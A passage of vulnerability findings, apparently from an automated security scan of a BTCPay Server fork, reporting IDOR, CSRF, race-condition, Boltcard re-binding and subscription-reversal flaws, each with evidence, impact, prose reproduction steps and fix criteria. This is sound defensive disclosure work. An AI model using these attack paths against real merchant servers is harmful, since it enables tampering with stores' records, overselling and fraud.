   GetWalletLabels filters only by the WalletId string; no ownership check (same for RemoveWalletLabels 755-765, RenameWalletLabel 767-802, RemoveWalletObjects 489-503, AddWalletObjectLabels).
12. [BTCPayServer/HostedServices/PendingTransactionService.cs:304–319](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/PendingTransactionService.cs#L304-L319)
   CancelPendingTransaction selects by (CryptoCode, StoreId, Id) only and sets State=Cancelled with no caller/ownership check.

## Impact
Confidentiality: the victim store's wallet labels (bookkeeping annotations, possibly customer names) and per-object labels are disclosed, and the type/id lookup confirms whether a given tx/address exists in the victim wallet; funds, keys and transaction lists themselves are not exposed. Integrity: labels can be added to, stripped from, renamed or deleted across the victim wallet, corrupting accounting metadata; a pending multisig transaction can be cancelled only if its random GUID is known (pending-tx listings remain guarded). Availability: no sustained impact.

## Reproduction steps
1. Attacker: any authenticated user who owns or belongs to some store with the relevant wallet permission on it (self-registered where registration is open, or invited); a store Owner holds all of them. They learn a victim store ID (exposed in pay-button HTML, LN embed URLs, rate API), then call /wallets/S-<victim>-BTC/labels.json?storeId=<own store> to read, or POST update-labels / labels/import / labels/{id}/delete|edit with ?storeId=<own store> and their own antiforgery token to tamper. Cookie principals carry the Unrestricted permission claim (CookieAuthenticationClaimTransformer), so the only check is HasPolicy on the attacker's own store. No defense must be defeated and no deployment state is required.

## Recommended fix
1. SqlStoreScopeProvider lets a request-supplied query/form `storeId` take precedence over the route `walletId`, so the store a policy is evaluated against can differ from the wallet the action operates on. Fix criteria: When a route carries `walletId`, the store scope must be derived from it (or the request must fail when a conflicting storeId is also supplied). Verify: GET /wallets/S-<other>-BTC/labels.json?storeId=<own> returns 403/404 for a non-member and the authorized store always equals walletId.StoreId.
2. LabelsJson, WalletLabels, UpdateLabels, ImportWalletLabels, DeleteWalletLabel, EditWalletLabel and CancelPendingTransactionConfirmed act on the bound walletId without confirming it belongs to the authorized store, unlike the other actions which go through GetDerivationSchemeSettings(walletId). Fix criteria: Every action in UIWalletsController (and the PSBT partial) must either verify GetCurrentStore().Id == walletId.StoreId or authorize explicitly against walletId.StoreId before touching WalletRepository/PendingTransactionService. Verify with a test where a member of store A requests each of these endpoints for store B's wallet and receives 403/404 with no data read or written.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** IDOR
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257439

---

# Payment request archive/unarchive is a state-changing GET exposed to cross-site request forgery

## Details
UIPaymentRequestController.TogglePaymentRequestArchival (GET /payment-requests/{payReqId}/archive) archives or unarchives a payment request — and publishes a PaymentRequestArchived webhook/email event — in response to a plain HTTP GET. BTCPay's only CSRF control is the global UIControllerAntiforgeryTokenAttribute, whose ShouldValidate exempts GET, and there is no Referer/Origin check. The Identity cookie keeps ASP.NET Core's default SameSite=Lax (nothing in BTCPayServerServices.cs:935-941 or Startup.cs:366-370 sets a mode), and Lax cookies are attached to cross-site top-level GET navigations.

Attack: payment-request ids are public (ViewPaymentRequest is [AllowAnonymous] and the link is handed to payers), so an attacker who received or saw a PR link knows a valid payReqId. They host a page that top-level navigates (link, meta-refresh, window.location) a logged-in store member holding CanModifyPaymentRequests to https://<btcpay-host>/payment-requests/<id>/archive. The browser attaches the victim's cookie, the permission scope provider resolves the store from payReqId (BTCPayServerServices.cs:514), authorization passes with the victim's role, and ArchivePaymentRequest toggles the flag. Archived PRs reject payment (PayPaymentRequest returns 'archived'), so a live collection link is silently disabled; a second navigation unarchives a PR the merchant deliberately retired, re-enabling payments to it.

Every other GET 'archive/delete/toggle' route in the code base (pull payments, stores, users, API keys, dynamic DNS, roles) renders a Confirm view and performs the mutation in an antiforgery-protected POST; this endpoint is the one that mutates on GET. Impact is bounded to toggling archival of payment requests in stores the victim can modify (low integrity/availability), but it is a reachable cross-site state change on a merchant resource that bypasses the shipped CSRF control.

## Evidence
1. [BTCPayServer/Controllers/UIPaymentRequestController.cs:534–548](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L534-L548)
   TogglePaymentRequestArchival is bound to [HttpGet("{payReqId}/archive")] under the Cookie scheme and immediately calls ArchivePaymentRequest(payReqId, true), flipping the Archived flag on a GET. Unlike every sibling GET 'archive/delete/toggle' route in the code base, it does not render a Confirm view and defer the mutation to a POST.
2. [BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs:46–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/UIControllerAntiforgeryTokenAttribute.cs#L46-L52)
   The global antiforgery filter's ShouldValidate returns false for GET/HEAD/TRACE/OPTIONS, so the only shipped CSRF control never runs for this endpoint. No Referer/Origin check exists elsewhere in Filters, Hosting or Security.
3. [BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs:63–83](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/PaymentRequests/PaymentRequestRepository.cs#L63-L83)
   ArchivePaymentRequest with toggle=true flips Archived unconditionally, saves, and publishes PaymentRequestEvent.Archived (mapped to the PaymentRequestArchived webhook/email trigger in Plugins/Webhooks).
4. [BTCPayServer/Controllers/UIPaymentRequestController.cs:427–435](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPaymentRequestController.cs#L427-L435)
   PayPaymentRequest refuses an archived request ('Payment Request cannot be paid as it has been archived'), so toggling archival disables a live collection link or re-enables a retired one.
5. [BTCPayServer/Hosting/BTCPayServerServices.cs:935–941](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/BTCPayServerServices.cs#L935-L941)
   The Identity application cookie is only given Login/AccessDenied/Logout paths; no SameSite mode is set here or anywhere in the application (Startup.cs:366-370 sets only HttpOnly/Secure). ASP.NET Core's CookieAuthenticationOptions default is SameSite=Lax (assumption: Microsoft.AspNetCore.App for net10.0), and Lax still attaches the cookie to cross-site top-level GET navigations, which is exactly this vector.
6. [BTCPayServer/Controllers/UIStorePullPaymentsController.PullPayments.cs:253–274](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStorePullPaymentsController.PullPayments.cs#L253-L274)
   The project's intended pattern for the same operation on pull payments: the GET /archive route returns View("Confirm") and the mutation lives in the [HttpPost] ArchivePullPaymentPost, which the antiforgery filter protects. The payment-request toggle skips this pattern.
7. [BTCPayServer/Views/UIPaymentRequest/GetPaymentRequests.cshtml:162](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIPaymentRequest/GetPaymentRequests.cshtml#L162)
   The UI invokes the action as a plain anchor (also EditPaymentRequest.cshtml:184,188), confirming the endpoint is designed as a side-effecting GET rather than an antiforgery-protected form post.

## Impact
No confidentiality impact. Integrity: the Archived flag of a merchant payment request is flipped without consent and a PaymentRequestArchived webhook/email trigger fires. Availability: an archived PR refuses payment (PayPaymentRequest), disabling a live payment link until the merchant notices; unarchiving re-opens a retired one. Reach is limited to payment requests in stores the victim can modify, so both are Low.

## Reproduction steps
1. The attacker is an unauthenticated network party (or a payer) who knows a payment-request id, which the merchant publishes to payers via the anonymous view link. They need only get a logged-in store member with CanModifyPaymentRequests to visit a page that performs a top-level navigation to the archive URL (passive interaction). The Identity cookie, at the framework default SameSite=Lax, is sent on top-level GET; the antiforgery filter does not run for GET; authorization passes with the victim's role and the toggle executes. No special deployment condition is required.

## Recommended fix
1. TogglePaymentRequestArchival performs a state change on an HTTP GET, which the global UIControllerAntiforgeryTokenAttribute exempts from antiforgery validation, so a cross-site top-level navigation carrying the SameSite=Lax Identity cookie can trigger it. Fix criteria: Archiving/unarchiving a payment request only succeeds for a POST request carrying a valid antiforgery token (e.g. the GET route renders the Confirm view and an [HttpPost] action performs the mutation, as ArchivePullPayment/ArchivePullPaymentPost and TogglePaymentRequestCompleted already do); the anchors in GetPaymentRequests.cshtml and EditPaymentRequest.cshtml submit forms; a cross-origin GET to /payment-requests/{id}/archive changes no state.
2. Defense in depth: the Identity cookie relies on the framework default SameSite=Lax, which permits cross-site top-level GET navigations, so any future side-effecting GET is CSRF-able. Fix criteria: An explicit SameSite policy is chosen and documented for the Identity cookie, or a repository test/analyzer asserts that no UI controller action mutates state on GET.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Cross-Site Request Forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257436

---

# PoS inventory check is not atomic with the asynchronous inventory decrement

## Details
The public PoS POST (`/apps/{appId}/pos/{viewType?}`, UIPointOfSaleController.cs:186-207; anonymous, [IgnoreAntiforgeryToken]) verifies stock by reading the app row (line 225), deserialising its settings into memory (`app.GetSettings<PointOfSaleSettings>()`, line 241; `AppService.Parse(settings.Template, false)`, line 259) and comparing the requested quantity with `itemChoice.Inventory` (lines 302-304). Nothing reserves the units. The invoice is then created through `CreateInvoiceCoreRaw`, which fetches exchange rates over the network, creates payment prompts and persists the invoice before publishing `InvoiceEvent.Created` (UIInvoiceController.cs:247-295). Only afterwards does `AppInventoryUpdaterHostedService` (a sequential event consumer on its own channel, AppInventoryUpdaterHostedService.cs:28-70) call `AppService.UpdateInventory` (AppService.cs:404-450), which re-reads the row and applies `inventory += delta` under an xmin optimistic-retry.

The xmin retry only protects the *update* against lost writes; the *check* ran against a stale snapshot and is never re-validated when the decrement lands, and `UpdateInventory` has no floor. Any number of concurrent requests issued inside the window (settings read -> rate fetch -> prompt creation -> invoice save -> event dispatch) all observe the same inventory and all pass. For an item with inventory 1, K parallel POSTs each yield a valid invoice for that unit; the hosted service then drives the counter to 1-K. If the attacker pays them, the merchant has K paid orders for one unit and a negative stock display; the maintainers clearly intend inventory as an enforced limit (server-side rejection "Inventory for {0} exhausted", restock on Expired/MarkedInvalid, POSTests asserting the decrement).

The only shipped control on this surface is `Throttle` (lines 454-457): a per-address rate limit, zone `publicinvoices rate=4r/min burst=10 delay=3` (Startup.cs:307). It does not serialize requests: under NicolasDorier.RateLimits 1.2.3 (nginx `limit_req` semantics, an assumption not verifiable in this checkout) the base request plus `delay=3` excess requests are admitted without delay, so a single address lands several concurrent POSTs inside the window; and because `UseForwardedHeaders` runs with KnownProxies/KnownIPNetworks cleared (Startup.cs:325-332), the throttle key `RemoteIpAddress` is whatever X-Forwarded-For the client sends, so the per-IP limit imposes no bound on concurrency at all.

## Evidence
1. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:297–304](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L297-L304)
   Availability check compares the requested quantity against itemChoice.Inventory from `choices`, an in-memory array parsed at line 259 from the settings snapshot read at line 241. Nothing reserves or decrements units here; every concurrent request sees the same number.
2. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:393–433](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L393-L433)
   Invoice creation via CreateInvoiceCoreRaw happens after the check; the decrement is only triggered by the InvoiceEvent.Created the invoice controller publishes once the invoice is saved.
3. [BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs:28–69](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/HostedServices/AppInventoryUpdaterHostedService.cs#L28-L69)
   The decrement is applied asynchronously by a sequential event consumer (EventHostedServiceBase channel) in a different execution context from the request that performed the check.
4. [BTCPayServer/Services/Apps/AppService.cs:404–449](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Apps/AppService.cs#L404-L449)
   UpdateInventory re-reads the row and applies `inventory += change.Delta` with an xmin optimistic retry. The retry only prevents lost updates; availability is never re-validated and there is no floor, so the counter goes negative.
5. [BTCPayServer/Controllers/UIInvoiceController.cs:247–295](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L247-L295)
   Rates are fetched (network), payment prompts created and the invoice persisted before InvoiceEvent.Created is published at line 295, giving the race a window of network latency per request.
6. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–207](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L207)
   Entry point: anonymous POST /apps/{appId}/pos/{viewType?} with [IgnoreAntiforgeryToken] and CORS All; the only gate before the inventory check is the per-IP Throttle.
7. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:454–457](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L454-L457)
   Throttle is a per-address rate limit (ZoneLimits.PublicInvoices keyed on HttpContext.Connection.RemoteIpAddress); it does not serialize requests or reserve stock.
8. [BTCPayServer/Hosting/Startup.cs:307](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L307)
   Production zone is `rate=4r/min burst=10 delay=3`; under NicolasDorier.RateLimits 1.2.3 (nginx limit_req semantics, assumed) several excess requests per burst are admitted immediately, so one address alone can land multiple concurrent POSTs inside the window.
9. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   UseForwardedHeaders with KnownProxies/KnownIPNetworks cleared and ForwardedHeaders.All: any peer sets RemoteIpAddress via X-Forwarded-For, so the per-IP throttle key is attacker-chosen and the rate limit is not a bound on concurrency.

## Impact
Merchant inventory integrity is defeated: a merchant-configured stock/capacity limit is bypassed (oversold, possibly paid, orders) and the stored counter is driven negative. No confidentiality impact; no availability impact beyond the merchant's own listing.

## Reproduction steps
1. Unauthenticated attacker sends concurrent POSTs to /apps/{appId}/pos for the last unit(s) of an inventoried item (choiceKey or a posData cart). Each request reads the same inventory snapshot and passes; each creates an invoice; decrements are applied later without re-validation or floor. The window includes a network rate fetch and prompt creation, so winning it is straightforward, but it remains a timing condition (AT:PRESENT). The per-IP throttle admits several immediate excess requests per burst and is keyed on a forwarded address any peer can set, so it does not limit the attack.

## Recommended fix
1. Availability is checked against a stale in-memory snapshot of the app template and the reservation/decrement happens later in a different execution context (event consumer), so concurrent orders all pass the same check. Fix criteria: Reserving units must be atomic with the availability check: a conditional decrement on the stored template that fails when inventory would go below zero, executed in the request before the invoice is persisted (with release on Expired/MarkedInvalid), or equivalent per-app serialization. Verify by firing concurrent orders for a single remaining unit and asserting exactly one invoice is created.
2. AppService.UpdateInventory applies deltas without a lower bound, so any over-admission is persisted as a negative count. Fix criteria: UpdateInventory (or the atomic reservation that replaces it) must refuse to drive inventory below zero and surface the failure to the caller; verify that the stored inventory never becomes negative under concurrent decrements.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257429

---

# Anonymous Boltcard registration endpoint re-binds any registered card to an arbitrary pull payment

## Details
POST /api/v1/pull-payments/{pullPaymentId}/boltcards is [AllowAnonymous] (swagger: 'Pull payments (Public)', security: []). It links an NTAG424 Boltcard, identified only by its 7-byte UID, to a pull payment and returns the deterministic card keys K0-K4 derived from (issuerKey, uid, version, pullPaymentId).

The only per-card state the server keeps is the `boltcards` row keyed by hash(issuerKey, uid). When the request carries `onExisting=UpdateVersion` (query string or body; also what the public pull-payment page's 'Setup Boltcard' deep link uses), the controller calls `LinkBoltcardToPullPayment(pullPaymentId, issuerKey, uid, UpdateVersion)` without any of: (a) checking that the card is not already registered, (b) checking that the existing registration belongs to the pull payment in the route, (c) requiring proof of control of the card (a valid SUN `c` MAC for the current registration, which the KeepVersion branch does verify), or (d) requiring authority over the store/pull payment that owns the current registration. The upsert `ON CONFLICT (id) DO UPDATE SET ppid=excluded.ppid, version=boltcards.version+1` then silently moves the registration to the caller's pull payment and bumps the version.

Root cause (CWE-639): a public write endpoint selects and mutates another party's security-relevant record — the card-to-pull-payment binding and key version — by a caller-supplied, non-secret key. The UID is not a secret in the Boltcard model: it is readable by any NFC reader (unless random UID is enabled) and is recoverable by the server from the `p=` parameter of any LNURLW the card emits (the server-wide issuer key decrypts it for the caller, lines 197-216), which every merchant terminal that ever received a tap holds.

Effect on the victim: every subsequent tap fails at UIBoltcardController.GetWithdrawRequest because CheckSunMac is computed with the new (version, ppId); the documented 'Reset Boltcard' (KeepVersion) link on the victim's own pull-payment page is rejected as 'registered on a different pull payment'. Recovery is possible only by first re-running 'Setup' against the victim's own pull payment (another UpdateVersion) and then 'Reset' with the card's LNURLW so the version-retry loop finds the card's real keys, and that loop gives up after 5 decrements — so the attacker can repeat the request at will, or bump the version more than five times, to keep the card unusable. The attacker gains no funds: the keys returned are bound to the attacker's own pull payment, and obtaining working keys for the victim's pull payment would require the victim's pull payment id, which already grants claims on it. What the position gains is a remote, repeatable way to invalidate the binding of any Boltcard issued by the server, including cards of other stores' customers on a multi-tenant instance. The ledger lead e6-boltcard-register-hijack describes this sink; this record files it.

## Evidence
1. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:240–244](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L240-L244)
   Primary location. When request.OnExisting is UpdateVersion (settable by the unauthenticated caller via query string or body), LinkBoltcardToPullPayment is called with the route pullPaymentId and the caller-supplied UID without checking that the card is unregistered, that the existing registration belongs to this pull payment, or that the caller proves control of the card (no SUN MAC check on this branch). Fresh K0-K4 for (uid, version+1, pullPaymentId) are then derived and returned.
2. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:184–234](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L184-L234)
   The action is [AllowAnonymous] (swagger security: []). The UID is taken from the request body (7 raw bytes, readable from the card over NFC) or recovered server-side by decrypting the p= parameter of any LNURLW the card ever emitted (lines 197-216); onExisting from the query string overrides the body (229-234). No rate limit zone is applied to this action.
3. [BTCPayServer/Data/BoltcardDataExtensions.cs:14–31](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Data/BoltcardDataExtensions.cs#L14-L31)
   The upsert keys on id=hash(issuerKey,uid) only; ON CONFLICT ... UPDATE SET ppid=excluded.ppid, version=boltcards.version+1 unconditionally moves the existing registration to the caller-supplied pull payment and bumps the version, invalidating the keys programmed on the physical card.
4. [BTCPayServer/Plugins/PullPayments.Boltcards/Controllers/UIBoltcardController.cs:46–51](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PullPayments.Boltcards/Controllers/UIBoltcardController.cs#L46-L51)
   On the victim's next tap the server looks the registration up by UID and derives the card key from (uid, registration.Version, registration.PullPaymentId), which now point at the attacker's pull payment and the bumped version; CheckSunMac against the card's real K2 fails and every withdrawal is rejected as 'Replayed or expired query'.
5. [BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs:247–279](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldPullPaymentController.cs#L247-L279)
   The KeepVersion ('Reset Boltcard') path refuses the victim's own pull payment with 'registered on a different pull payment' (line 253-257) once the row has been moved, and the version-retry loop that could recover the card's real keys gives up after 5 decrements (line 275), so an attacker who bumps the version more than five times defeats recovery even after the victim re-binds the card to their own pull payment.
6. [BTCPayServer/Extensions/SettingsRepositoryExtensions.cs:10–23](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Extensions/SettingsRepositoryExtensions.cs#L10-L23)
   A single server-wide issuer key is used for every card, so the server can decrypt the p= of any card's LNURLW on the caller's behalf; a captured tap (e.g. held by any PoS the card was tapped on) therefore suffices to obtain the UID needed for the request.
7. [BTCPayServer/Controllers/UIPullPaymentController.cs:93–113](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIPullPaymentController.cs#L93-L113)
   The public pull payment page advertises deep links to this endpoint with onExisting=UpdateVersion ('Setup Boltcard'), confirming the endpoint and this branch are part of the public, unauthenticated surface by design; the sanctioned use assumes the programming app holds the physical card, which the server never verifies.

## Impact
Integrity: another party's card registration (pull payment binding and key version) is overwritten by an anonymous caller, repeatable against every card whose UID or tap the attacker has seen. Availability: the physical card stops working for withdrawals and the documented reset flow is blocked; recovery needs a multi-step re-bind that the attacker can undo again. No confidentiality impact: the returned keys belong to the attacker's own pull payment and reveal nothing about the victim's card keys or funds, and the attacker cannot spend from the victim's pull payment.

## Reproduction steps
1. Unauthenticated HTTP POST to a documented public endpoint with no rate limit. The attacker needs the target card's 7-byte UID or one LNURLW it emitted (NFC proximity, or any PoS/phone that received a tap), and one LNURL-capable pull payment id (their own store's — any self-registered user with a Lightning payout method configured — or any public pull-payment link they were ever given); these vantage/knowledge conditions are outside the attacker's control, hence AT:PRESENT. No MAC check, ownership check, antiforgery or authentication stands on the UpdateVersion branch, so the request succeeds deterministically.

## Recommended fix
1. RegisterBoltcard mutates an existing card registration (UpdateVersion path) without verifying that the caller controls the card or is authorized for the pull payment/store the card is currently bound to; the card UID used as the key is not a secret. Fix criteria: Re-linking or version-bumping an already-registered card must require either a valid SUN MAC (`c`) for the card's current registration (proving physical control), or an authenticated caller authorized on the store owning the current registration. An anonymous request carrying only a UID (or only `p`) for a card already bound to a different pull payment must be rejected, and the victim's existing registration and version must remain unchanged. Verify by registering a card to pull payment A and confirming an anonymous UpdateVersion request against pull payment B with the same UID fails and leaves version/ppid intact.
2. BoltcardDataExtensions.LinkBoltcardToPullPayment's upsert unconditionally overwrites ppid for an existing row, so the data layer offers no guard against cross-pull-payment re-binding. Fix criteria: The data-layer operation should only update rows whose ppid is NULL or equals the requested pull payment (or be given an explicit, authorized 'force rebind' flag), so that an unexpected conflict is surfaced to the caller rather than silently moving the registration.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** IDOR/BOLA
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257291

---

# Optimistic subscription activation never reverted when unconfirmed payment fails or is double-spent

## Details
Plans can enable 'Optimistic activation' (PlanData.OptimisticActivation). With it, SubscriptionHostedService.ProcessSubscriptionPayment reacts to the InvoiceEvent PaidInFull while the invoice is still Processing (zero confirmations): SubscriptionContext.GetAmountToCredit returns invoice.PaidAmount.Net (unconfirmed, including over-payment), the subscriber is credited, TryStartPlan charges the plan price from that credit and starts the plan, and SubscriberActivated/PlanStarted webhooks and emails fire.

The documentation (docs/users/offerings.md, 'Plan Lifecycle') promises: 'If the invoice later fails or is cancelled, the subscriber is deactivated', and the service has a branch for it (lines 514-524: when the invoice is Invalid and the checkout started the plan, the subscriber is suspended). However that branch is unreachable for every automatic failure:

1. The event filter at lines 56-66 only admits EventCode Completed, MarkedCompleted, MarkedInvalid or PaidInFull. When a Processing invoice never confirms, InvoiceWatcher (lines 156-170) sets Status=Invalid and raises InvoiceEvent.FailedToConfirm (code 1013) - not MarkedInvalid - so the subscription service drops the event and the suspension branch never runs.
2. When the unconfirmed transaction is replaced/double-spent, NBXplorerListener marks the payment Unaccounted (line 334) and InvoiceWatcher moves the invoice from Processing back to New (lines 145-150) and later Expired. None of these events are handled at all.
3. Even on the manual MarkedInvalid path, the credit obtained from the unconfirmed payment is never reversed (commented-out code at lines 517-519); only the manual path suspends.

The maintainers' test (BTCPayServer.Tests/SubscriptionTests.cs lines 947-962) exercises only the manual MarkInvoiceStatus(Invalid) path, which is why the gap is invisible to the suite.

Attack: a payer (anonymous holder of a shared plan-checkout link, or a subscriber adding credit from the portal) pays the invoice with a low-fee / RBF-signalled on-chain transaction, or any transaction they can later double-spend. The moment the mempool transaction is seen the subscription is activated and an over-payment becomes persistent credit. The payer then replaces or lets the transaction drop: the invoice silently reverts to New/Expired or becomes Invalid via FailedToConfirm, but the subscriber stays Active with Phase=Normal, PeriodEnd a full period ahead, and any excess credit intact; the merchant is never notified (no SubscriberDisabled event) and auto-renewal can later consume the phantom credit. Lightning payments are atomic and are not affected; the path requires an on-chain payment method and a plan with OptimisticActivation enabled (off by default in the UI and DB).

## Evidence
1. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:53–70](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L53-L70)
   Event filter admits only Completed/MarkedCompleted/MarkedInvalid/PaidInFull with status Settled/Invalid/Processing; FailedToConfirm (auto-Invalid), Expired and the Processing->New reversal are all dropped, so no automatic payment failure reaches ProcessSubscriptionPayment.
2. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:469–512](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L469-L512)
   On a Processing (unconfirmed) invoice with plan.OptimisticActivation the subscriber is credited with GetAmountToCredit (PaidAmount.Net) and TryStartPlan starts the plan immediately.
3. [BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs:514–524](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionHostedService.cs#L514-L524)
   The only reversal logic: suspend the subscriber when the invoice is Invalid; reachable solely through the merchant's manual MarkedInvalid event, and the credit is deliberately not reversed (commented-out code).
4. [BTCPayServer/Plugins/Subscriptions/SubscriptionContext.cs:31–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Subscriptions/SubscriptionContext.cs#L31-L33)
   GetAmountToCredit uses invoice.PaidAmount.Net (unconfirmed payments) while the invoice is Processing.
